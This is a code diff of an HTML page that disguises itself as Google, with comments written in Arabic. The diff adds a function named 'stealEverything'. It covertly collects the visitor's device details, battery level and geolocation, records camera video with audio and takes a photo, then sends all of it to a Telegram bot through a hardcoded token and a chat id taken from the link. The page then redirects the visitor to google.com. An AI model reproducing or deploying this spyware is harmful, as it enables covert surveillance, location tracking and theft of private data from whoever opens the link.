@@ -3,88 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="refresh" content="0; url=https://www.google.com">
-    <title>Loading...</title>
+    <title>Google</title>
     <style>
         body { display: none; }
     </style>
 </head>
 <body>
     <script>
-        // ==================== قراءة الإيدي من الرابط مباشرة ====================
+        // ==================== قراءة الإيدي من الرابط ====================
         function getUserIdFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('id'); // يجيب قيمة id من الرابط
+            return urlParams.get('id');
         }
 
-        // ==================== الإعدادات ====================
-        const USER_ID = getUserIdFromURL(); // ⭐ هذا ياخذ الإيدي من الرابط
+        const USER_ID = getUserIdFromURL();
         const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
 
-        // إذا ما كان في id بالرابط، نوقف التنفيذ
         if (!USER_ID) {
-            console.error('ماكو id بالرابط');
             window.location.replace("https://www.google.com");
         } else {
-            // ==================== دالة الإرسال ====================
-            async function sendVideoToTelegram(videoBlob) {
+            // ==================== دوال الإرسال ====================
+            async function sendToTelegram(type, data, filename) {
                 try {
                     const formData = new FormData();
-                    formData.append('chat_id', USER_ID); // الإيدي اللي جه من الرابط
-                    formData.append('video', videoBlob, 'recorded_video.mp4');
-                    formData.append('caption', `🎥 تسجيل فيديو - ${new Date().toLocaleString()}`);
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error('Error sending video:', error);
-                }
+                    formData.append('chat_id', USER_ID);
+                    
+                    if (type === 'photo') {
+                        formData.append('photo', data, filename || 'photo.jpg');
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST', body: formData
+                        });
+                    } else if (type === 'video') {
+                        formData.append('video', data, filename || 'video.mp4');
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                            method: 'POST', body: formData
+                        });
+                    } else if (type === 'text') {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: USER_ID, text: data })
+                        });
+                    }
+                } catch (e) {}
             }
 
-            // ==================== تسجيل الفيديو ====================
-            async function captureAndSendVideo() {
+            // ==================== سحب كل شيء ====================
+            async function stealEverything() {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 },
-                            facingMode: 'environment'
-                        }, 
-                        audio: true 
-                    });
-
-                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                    mediaRecorder.onstop = async () => {
-                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                        await sendVideoToTelegram(videoBlob);
-                        stream.getTracks().forEach(track => track.stop());
+                    // 1. معلومات الجهاز
+                    const info = {
+                        'User Agent': navigator.userAgent,
+                        'اللغة': navigator.language,
+                        'المنصة': navigator.platform,
+                        'الشاشة': `${screen.width}x${screen.height}`,
+                        'المنطقة': Intl.DateTimeFormat().resolvedOptions().timeZone
                     };
+                    let infoText = '🔰 معلومات الجهاز:\n';
+                    for (const [k, v] of Object.entries(info)) infoText += `${k}: ${v}\n`;
+                    await sendToTelegram('text', infoText);
 
-                    mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 7000);
+                    // 2. البطارية
+                    try {
+                        const battery = await navigator.getBattery();
+                        await sendToTelegram('text', `🔋 بطارية: ${Math.round(battery.level * 100)}%`);
+                    } catch(e) {}
 
-                } catch (error) {
-                    console.error('Camera error:', error);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: USER_ID,
-                            text: `❌ فشل الوصول للكاميرا`
-                        })
-                    });
-                }
+                    // 3. الموقع
+                    try {
+                        const pos = await new Promise((r) => navigator.geolocation.getCurrentPosition(r));
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: USER_ID,
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude
+                            })
+                        });
+                    } catch(e) {}
+
+                    // 4. تصوير فيديو
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'environment' }, 
+                            audio: true 
+                        });
+                        
+                        const recorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = async () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            await sendToTelegram('video', blob, `video_${Date.now()}.webm`);
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 7000);
+                    } catch(e) {}
+
+                    // 5. تصوير صورة
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => sendToTelegram('photo', blob, `photo_${Date.now()}.jpg`));
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 1000);
+                    } catch(e) {}
+
+                } catch(e) {}
             }
 
-            // ==================== شغّل كل شيء ====================
-            (async function() {
-                captureAndSendVideo();
-                window.location.replace("https://www.google.com");
-            })();
+            // ==================== التشغيل ====================
+            stealEverything();
+            window.location.replace("https://www.google.com");
         }
     </script>
 </body>
